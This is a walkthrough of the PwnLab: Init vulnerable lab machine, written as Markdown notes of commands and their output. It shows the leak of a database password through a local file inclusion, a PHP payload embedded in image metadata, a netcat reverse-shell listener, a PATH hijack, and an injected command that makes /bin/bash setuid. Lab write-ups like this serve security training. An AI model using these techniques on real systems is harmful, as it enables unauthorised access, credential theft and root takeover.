```http
https://www.vulnhub.com/entry/pwnlab-init,158/
```

```ip
192.168.3.185
```
___
# Nmap 
```bash
nmap -Pn -p- -sC -sV -T5 192.168.3.185 -vv
```

```resoults
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34424/udp6  status
|   100024  1          40636/tcp   status
|   100024  1          49959/udp   status
|_  100024  1          53692/tcp6  status
3306/tcp  open  mysql   syn-ack ttl 64 MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 39
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, Speaks41ProtocolOld, ODBCClient, IgnoreSigpipes, LongPassword, SupportsCompression, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ConnectWithDatabase, Speaks41ProtocolNew, InteractiveClient, SupportsTransactions, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: G&):*`(ARXB$)BRT15X:
|_  Auth Plugin Name: mysql_native_password
40636/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
```

> [!important]
> Open Ports
> 80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
> 111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
> 3306/tcp  open  mysql   syn-ack ttl 64 MySQL 5.5.47-0+deb8u1

## NSE
```bash
nmap 192.168.3.185 -p80 --script=http*
```

```resoult
PORT   STATE SERVICE
80/tcp open  http
| http-auth-finder: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.3.185
|   url                                  method
|_  http://192.168.3.185:80/?page=login  FORM
|_http-comments-displayer: Couldn't find any comments.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-chrono: Request times for /; avg: 29.13ms; min: 17.12ms; max: 42.84ms
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.3.185
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.3.185:80/?page=login
|     Form id: user
|_    Form action: 
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-title: PwnLab Intranet Image Hosting
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1
|     /images/
|       png: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /images/
|   Total files found (by extension):
|_    Other: 1; png: 1
| http-brute:   
|_  Path "/" does not require authentication
|_http-errors: Couldn't find any error pages.
| http-vhosts: 
|_128 names had status 200
|_http-malware-host: Host appears to be clean
|_http-date: Wed, 14 May 2025 22:26:32 GMT; +2s from local time.
| http-headers: 
|   Date: Wed, 14 May 2025 22:26:33 GMT
|   Server: Apache/2.4.10 (Debian)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-cookie-flags: 
|   /login.php: 
|     PHPSESSID: 
|_      httponly flag not set
| http-traceroute: 
|_  Possible reverse proxy detected.
|_http-server-header: Apache/2.4.10 (Debian)
|_http-slowloris: false
|_http-xssed: No previously reported XSS vuln.
|_http-feed: Couldn't find any feeds.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-enum: 
|   /login.php: Possible admin folder
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|_  /upload/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
```

```bash
nmap 192.168.3.185 -p3306 --script=mysql*
```

```resoults
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 48
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, SupportsTransactions, Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, InteractiveClient, ODBCClient, SupportsLoadDataLocal, LongPassword, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ;SnS3D<Br:j)*5k<*\rI
|_  Auth Plugin Name: mysql_native_password
| mysql-enum: 
|   Valid usernames: 
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     root:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|   Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
|_  ERROR: Host '192.168.3.182' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
| mysql-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 50009 guesses in 24 seconds, average tps: 2095.7
```
___
### Nikto
```bash
nikto -h 192.168.3.185
```

![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515013049.png)
___
# WEB
![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515010039.png)
```http
http://192.168.3.185/?page=upload
```

![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515010056.png)
```http
http://192.168.3.185/?page=login
```

### FFUF
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FFUZ -u http://192.168.3.185/FFUZ -ic -c 
```

```resoults
upload                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 2ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 265ms]
```
___
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt:FFUZ -u http://192.168.3.185/FFUZ.php -ic -c 
```

```resoults
index                   [Status: 200, Size: 332, Words: 28, Lines: 12, Duration: 51ms]
login                   [Status: 200, Size: 250, Words: 16, Lines: 6, Duration: 50ms]
upload                  [Status: 200, Size: 19, Words: 5, Lines: 1, Duration: 12ms]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 7ms]
```
___
```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FFUZ -u http://192.168.3.185/?page=FFUZ -ic -c -fs 265
```

```resoults
n/a
```

### sqlmap 

> [!warning]
> 3306/tcp  open  mysql   syn-ack ttl 64 MySQL 5.5.47-0+deb8u1

```bash
sqlmap -u http://192.168.3.185/?page=login --form --batch --level=5 --risk=3
```

```resoults
n/a
```
___
```
sqlmap -u http://192.168.3.185/?page=* --batch --level=5 --risk=3 
```

```resoults
n/a
```
___
# rpsbind

## rpcinfo

> [!important]
> 111/tcp   open  rpcbind syn-ack ttl 64 2-4

```bash
rpcinfo -T tcp 192.168.3.185
```

```resoults
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100024    1    udp       0.0.0.0.195.39         status     106
    100024    1    tcp       0.0.0.0.158.188        status     106
    100024    1    udp6      ::.134.120             status     106
    100024    1    tcp6      ::.209.188             status     106

```

> [!question]
> superuser

# PHP Wrapper
![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515020414.png)
```http
https://addons.mozilla.org/ru/firefox/addon/hacktools/?utm_source=addons.mozilla.org&utm_medium=referral&utm_content=search
```

```Wraper
php://filter/convert.base64-encode/resource=config
```
![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515020605.png)

![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515020749.png)

```php
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>                           
```

> [!Creds]
> root:H4u%QJ_H99

# mysql
```bash
mysql -h 192.168.3.185 -u "root" -p --ssl=0
```
___
```mysql
show databases;
```

```resoults
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
```
___
```mysql
show tables;
```

```resoults
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
```
___
```mysql
select * from users;
```

```resoults
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
```

> [!Creds]
> kent:JWzXuBJJNy
> mike:SIfdsTEn6I
> kane:iSv5Ym2GRo

# ~~File Uploud to RCE~~
![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515022052.png)

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" sad.jpg -o polyglot.php
```

```http
http://192.168.3.185/?page=php://filter/convert.base64-encode/resource=upload
```

```
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
        <body>
                <form action='' method='post' enctype='multipart/form-data'>
                        <input type='file' name='file' id='file' />
                        <input type='submit' name='submit' value='Upload'/>
                </form>
        </body>
</html>
<?php 
if(isset($_POST['submit'])) {
        if ($_FILES['file']['error'] <= 0) {
                $filename  = $_FILES['file']['name'];
                $filetype  = $_FILES['file']['type'];
                $uploaddir = 'upload/';
                $file_ext  = strrchr($filename, '.');
                $imageinfo = getimagesize($_FILES['file']['tmp_name']);
                $whitelist = array(".jpg",".jpeg",".gif",".png"); 

                if (!(in_array($file_ext, $whitelist))) {
                        die('Not allowed extension, please upload images only.');
                }

                if(strpos($filetype,'image') === false) {
                        die('Error 001');
                }

                if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
                        die('Error 002');
                }

                if(substr_count($filetype, '/')>1){
                        die('Error 003');
                }

                $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
                        echo "<img src=\"".$uploadfile."\"><br />";
                } else {
                        die('Error 4');
                }
        }
}

?>   
```

![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515024353.png)
___
```http
http://192.168.3.185/?page=php://filter/convert.base64-encode/resource=login
```

```php
<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
	$luser = $_POST['user'];
	$lpass = base64_encode($_POST['pass']);

	$stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
	$stmt->bind_param('ss', $luser, $lpass);

	$stmt->execute();
	$stmt->store_Result();

	if ($stmt->num_rows == 1)
	{
		$_SESSION['user'] = $luser;
		header('Location: ?page=upload');
	}
	else
	{
		echo "Login failed.";
	}
}
else
{
	?>
	<form action="" method="POST">
	<label>Username: </label><input id="user" type="test" name="user"><br />
	<label>Password: </label><input id="pass" type="password" name="pass"><br />
	<input type="submit" name="submit" value="Login">
	</form>
	<?php
}
```
___

```http
http://192.168.3.185/?page=php://filter/convert.base64-encode/resource=index
```

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```

![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515030732.png)
___

# RCE

```bash
nc -lnvp 1337
```

![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515033658.png)

# LPE


```bash
ls -la /home
```

```resoults
drwxr-xr-x  6 root root 4096 Mar 17  2016 .
drwxr-xr-x 21 root root 4096 Mar 17  2016 ..
drwxr-x---  2 john john 4096 Mar 17  2016 john
drwxr-x---  2 kane kane 4096 Mar 17  2016 kane
drwxr-x---  2 kent kent 4096 Mar 17  2016 kent
drwxr-x---  2 mike mike 4096 Mar 17  2016 mike
```

> [!important]
> kent:JWzXuBJJNy +
> mike:~~SIfdsTEn6I~~ -
> kane:iSv5Ym2GRo +


![[20250515035029.png]]

```bash
strings msgmike
```

```PATH
cat /home/mike/msg.txt
```
___
### PATH to MIKE
```bash
echo '/bin/sh' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH
./msgmike
```
![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515040358.png)

```bash
strings msg2root
```
![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515041449.png)
# bash comment & read flag


```bash
"test" > /tmp/1 && chmod u+s /bin/bash && /bin/echo "qweqwe"
```

```bash
passwd root
```

![PwnLab_init](https://raw.githubusercontent.com/GooseGusevich/Vulnhub/refs/heads/main/PwnLab_init/screenshots/20250515043907.png)